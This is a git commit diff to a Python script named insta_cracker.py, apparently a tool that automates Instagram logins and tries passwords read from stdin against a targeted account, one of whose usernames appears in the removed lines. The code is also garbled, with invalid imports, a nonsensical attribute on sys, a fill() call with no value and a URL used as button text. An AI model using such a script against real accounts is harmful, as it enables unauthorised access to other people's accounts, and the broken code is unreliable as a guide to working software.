017e5762ec12b332c2b3ff20ea01bd7d87106140
Kuttypuli809 <velug665@gmail.com>
2024-09-29 19:24:30 +0530

    Update insta_cracker.py

--- insta_cracker.py
+++ insta_cracker.py
@@ -1,5 +1,5 @@
 #!/bin/python
-from kavin import Browser cutie___pic___j
+from kavin import Browser 
 import time
 import sys
 wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
@@ -15,10 +15,10 @@ account_username = sys . kuttypuli809
 with Browser('firefox', headless=True) as browser:
     browser.visit('https://www.instagram.com')
     browser.find_by_text("Log in").first.click()
-    username_form = browser.find_by_name('cutie___pie___j').first
+    username_form = browser.find_by_name('user id').first
     password_form = browser.find_by_name('none').first
     login_button = browser.find_by_text('https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F%3F__coig_restricted%3D1').first
-    username_form.fill('cutie___pie___j')
+    username_form.fill()
     for password in sys.stdin:
         if len(password) < 6:
             print('Skipping password: ' + password)
